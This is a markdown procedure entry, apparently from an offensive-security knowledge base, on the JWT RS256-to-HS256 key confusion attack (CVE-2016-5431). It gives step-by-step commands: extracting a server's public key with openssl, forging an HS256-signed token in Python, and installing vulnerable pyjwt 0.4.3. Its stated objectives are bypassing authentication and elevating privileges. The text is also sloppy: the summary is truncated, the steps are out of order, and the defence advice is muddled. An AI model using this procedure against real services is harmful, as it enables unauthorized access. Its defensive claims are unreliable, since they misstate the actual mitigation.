---
id: 9aec9922-08ff-45bb-b658-a72458cee564
name: JWT Key Confusion Attack RS256 to HS256
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.640965+00:00'
updated_at: '2023-04-10T20:22:33.469680+00:00'
tags:
- '[[JWT - JSON Web Token]]'
- '[[JWT Signature]]'
- '[[JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)]]'
commands:
- '[[Encode data with JWT]]'
- '[[Extract Public Key from SSL Certificate]]'
- '[[Install pyjwt version 0.4.3 using pip]]'
---

# JWT Key Confusion Attack RS256 to HS256

## Summary

This attack is based on the confusion of the key used for signing JWT tokens. An attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server, this attack can be executed. The attac

## Description

# Description

This attack is based on the confusion of the key used for signing JWT tokens. An attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server, this attack can be executed. The attacker can then use this token to elevate privileges, bypass authentication, or perform other malicious actions. This attack can be executed remotely and can be used to gain access to sensitive data or systems.

## Requirements

1. Access to the RSA public key

## Defense

1. Use asymmetric keys instead of symmetric keys for signing JWT tokens

1. Use different key pairs for TLS and JWT token signing

1. Monitor for unauthorized use of JWT tokens

## Objectives

1. Obtain sensitive data

1. Elevate privileges

1. Bypass authentication

# Instructions

1. Connect to the target server and retrieve the public key

**Code**: [[openssl s_client -connect example.com:443 | openss]]

> This command retrieves the public key from the target server's TLS certificate.

**Command** ([[Extract Public Key from SSL Certificate]]):

```bash
openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout
```

2. Use the retrieved public key to sign data with the HS256 algorithm

**Code**: [[import jwt
public = open('public.pem', 'r').read()]]

> This command uses the retrieved public key to sign data with the HS256 algorithm. The data parameter can be modified to include the payload that the attacker wants to sign.

**Command** ([[Encode data with JWT]]):

```bash
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

3. Install pyjwt version 0.4.3

**Code**: [[pip install pyjwt==0.4.3]]

> This command installs the vulnerable version of pyjwt that allows the attacker to perform the key confusion attack.

**Command** ([[Install pyjwt version 0.4.3 using pip]]):

```bash
pip install pyjwt==0.4.3
```

## Commands Used

- [[Encode data with JWT]]
- [[Extract Public Key from SSL Certificate]]
- [[Install pyjwt version 0.4.3 using pip]]

## Tags

- [[JWT - JSON Web Token]]
- [[JWT Signature]]
- [[JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)]]
